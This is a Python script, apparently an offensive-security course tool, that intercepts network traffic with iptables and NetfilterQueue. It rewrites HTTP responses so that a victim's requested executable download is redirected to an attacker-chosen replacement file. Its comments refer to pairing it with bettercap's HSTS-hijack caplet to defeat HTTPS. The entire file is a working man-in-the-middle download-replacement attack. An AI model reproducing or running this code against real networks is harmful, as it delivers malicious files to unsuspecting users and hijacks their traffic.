#!/usr/bin/env python3

import optparse
import subprocess
import netfilterqueue
import scapy.all as scapy


ack_list = []

def get_options():
    parser = optparse.OptionParser()
    parser.add_option("-r",  "--replacement", dest="replacement", help="Enter link to replacement file,\nEXAMPLE: http://domain.com/file.type")
    parser.add_option("-f", "--filetype", dest="file_type", default="exe", help="Enter filetype you want to change to replacement, DEFAULT - exe")
    options = parser.parse_args()[0]

    if not options.replacement:
        parser.error("\033[91m[-] Please specify a replacement file link. Use --help for more info.")
    return options

def prepare_iptables():
    # subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # without bettercap

    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True) # with bettercap hstshijack caplet
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True) # with bettercap hstshijack caplet

def set_load(packet):
    packet[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {options.replacement}\n\n"

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 8080: # Change to 80 if not using bettercap hstshijack
            if f".{options.file_type}" in str(scapy_packet[scapy.Raw].load) and options.replacement not in str(scapy_packet[scapy.Raw].load):
                print(f"\033[1;32;40m[+] {options.file_type} Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 8080: # Change to 80 if not using bettercap hstshijack
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("\033[1;32;40m[+] Replacing file")

                modified_packet = set_load(scapy_packet)
                packet.set_payload(bytes(modified_packet))
    packet.accept()

def restore():
    print("\n\033[1;35;40m[+] Detected CTRL + C. Quiting.... Please wait!")
    subprocess.call("iptables --flush", shell=True)


options = get_options()
prepare_iptables()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    restore()
